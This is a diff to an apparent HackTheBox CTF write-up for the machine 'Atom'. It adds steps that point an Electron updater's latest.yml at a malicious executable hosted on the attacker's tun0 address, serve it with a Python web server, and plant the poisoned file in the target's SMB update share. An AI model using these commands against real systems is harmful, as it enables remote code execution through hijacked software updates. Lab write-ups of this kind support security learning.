@@ -240,8 +240,16 @@ shasum -a 512 "Po77'.exe" | cut -d " " -f1 | xxd -r -p | base64
 ```yaml
 version: 1.2.3
  files:
-   path: http:///s'hell.exe
+   path: http://tun0/"Po77'.exe"
    sha512: yk6irOV/MlSY5BEDFR2aXg+41HTSyB0ggJBDXrcbJ0hVzaXS/.......==
+```
+4. Host it 
+```bash
+python3 -m http.server 80
+```
+5. upload to smb server
+```bash
+ smbclient -N //atom.htb/Software_Updates -c 'put latest.yml client1/latest.yml; put latest.yml client2/latest.yml; put latest.yml client3/latest.yml'
 ```
 ### Exploitation
 
